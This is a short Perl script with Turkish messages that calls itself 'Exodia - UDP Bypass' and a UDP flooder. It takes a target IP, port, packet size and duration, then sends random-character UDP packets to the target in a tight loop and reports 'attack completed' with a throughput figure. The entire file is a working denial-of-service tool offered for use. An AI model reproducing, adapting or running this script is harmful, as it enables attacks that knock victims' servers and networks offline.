#!/usr/bin/perl

use Socket;
use strict;
eval {require Socket6}; our $has_socket6 = 0;
unless ($@) { $has_socket6 = 1; import Socket6; };
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
our $ipv6 = 0;
print BOLD WHITE "Exodia - UDP Bypass [+] Kullanım <IP Adresi> <Port> <Paket> <Zaman>  \n";
print RED "Exodia - UDP Bypass [+] Bu script Exodia tarafından yapılmıştır. \n";
print BOLD BLACK  "     \n";

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$count);

$iaddr = inet_aton("$ip") or die "Hedef IP adresi yanlış veya bulunamadı. - Exodia UDP Optimized Flooder  $ip \n";

$endtime = time() + $time;

socket(sckt, PF_INET, SOCK_DGRAM, 17);
print "──────────────────────────────────────────────────────── \n";
print BOLD BLUE "          [+] Hedef IP Adresi = $ip \n";
print BOLD RED "          [+] Hedef Port Numarası = $port \n";
print BOLD GREEN "          [+] Gönderilecek Paket = $size \n";
print BOLD YELLOW "          [+] Zaman = $time \n";
print BLACK RED "          [+] Durdurmak için CTRL + C \n";
print "──────────────────────────────────────────────────────── \n";

my @chars = ("A".."Z", "a".."z");
my $string;
$string .= $chars[rand @chars] for 1..$size;

$count = 0;

for (;time() <= $endtime; $count++) {
  send(sckt, $string, 0, pack_sockaddr_in($port, $iaddr));
  }

print "Saldırı Tamamlandı, ";
printf("%.2f", ((($count/$time)*($size*10))/2000/2000));
print " Mb/s. \n";
